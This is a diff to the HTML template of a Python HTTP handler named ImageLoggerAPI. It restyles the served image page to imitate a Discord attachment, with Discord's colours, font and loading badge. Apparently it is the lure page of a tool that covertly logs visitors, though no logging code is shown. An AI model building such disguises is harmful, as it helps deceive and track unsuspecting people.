@@ -195,58 +195,98 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+
 body {{
-    background-color: #0e0e10;
+    background-color: #313338; /* Offizieller Discord Dark Theme Background */
     height: 100vh;
     width: 100vw;
     display: flex;
     justify-content: center;
     align-items: center;
+    font-family: 'gg sans', 'Noto Sans', Helvetica, Arial, sans-serif;
     overflow: hidden;
-    position: relative;
-    font-family: sans-serif;
 }}
-/* Unscharfer Hintergrund, damit keine grauen Ränder entstehen */
-.bg-blur {{
+
+/* Discord Media Container */
+.discord-card {{
+    position: relative;
+    background-color: #2b2d31;
+    border-radius: 8px;
+    overflow: hidden;
+    max-width: 90vw;
+    max-height: 90vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-width: 300px;
+    min-height: 300px;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+}}
+
+/* Grauer Verlauf als Bild-Platzhalter */
+.placeholder {{
     position: absolute;
-    top: -10%; left: -10%;
-    width: 120%; height: 120%;
-    background-image: url('{url}');
-    background-position: center;
-    background-size: cover;
-    filter: blur(25px) brightness(0.3);
+    inset: 0;
+    background: linear-gradient(135deg, #383a40 0%, #2b2d31 100%);
     z-index: 1;
 }}
-/* Hauptbild */
-.main-img {{
-    position: relative;
-    z-index: 2;
-    max-width: 100%;
-    max-height: 100vh;
-    object-fit: contain;
-    box-shadow: 0 8px 32px rgba(0,0,0,0.6);
-}}
-/* Lade-Anzeige / Spinner */
-.loader {{
+
+/* Lade-Kreis Badge oben rechts (Discord-Style) */
+.loading-badge {{
     position: absolute;
-    z-index: 3;
-    border: 4px solid rgba(255, 255, 255, 0.2);
-    border-left-color: #00ffff;
+    top: 10px;
+    right: 10px;
+    width: 28px;
+    height: 28px;
+    background-color: rgba(0, 0, 0, 0.55);
     border-radius: 50%;
-    width: 45px;
-    height: 45px;
-    animation: spin 0.8s linear infinite;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 3;
 }}
+
+.spinner {{
+    width: 14px;
+    height: 14px;
+    border: 2px solid rgba(255, 255, 255, 0.2);
+    border-top-color: #ffffff;
+    border-radius: 50%;
+    animation: spin 0.75s linear infinite;
+}}
+
 @keyframes spin {{
     0% {{ transform: rotate(0deg); }}
     100% {{ transform: rotate(360deg); }}
 }}
+
+/* Bild (blendet sanft ein sobald geladen) */
+.main-img {{
+    position: relative;
+    z-index: 2;
+    max-width: 100%;
+    max-height: 90vh;
+    object-fit: contain;
+    opacity: 0;
+    transition: opacity 0.2s ease-in-out;
+}}
+
+.main-img.loaded {{
+    opacity: 1;
+}}
 </style>
 </head>
 <body>
-<div class="bg-blur"></div>
-<div class="loader" id="spinner"></div>
-<img class="main-img" src="{url}" alt="Image" onload="document.getElementById('spinner').style.display='none';">
+
+<div class="discord-card">
+    <div class="placeholder" id="placeholder"></div>
+    <div class="loading-badge" id="loader">
+        <div class="spinner"></div>
+    </div>
+    <img class="main-img" id="img" src="{url}" alt="Attachment" 
+         onload="document.getElementById('loader').style.display='none'; document.getElementById('placeholder').style.display='none'; this.classList.add('loaded');">
+</div>
+
 </body>
 </html>'''.encode()
             
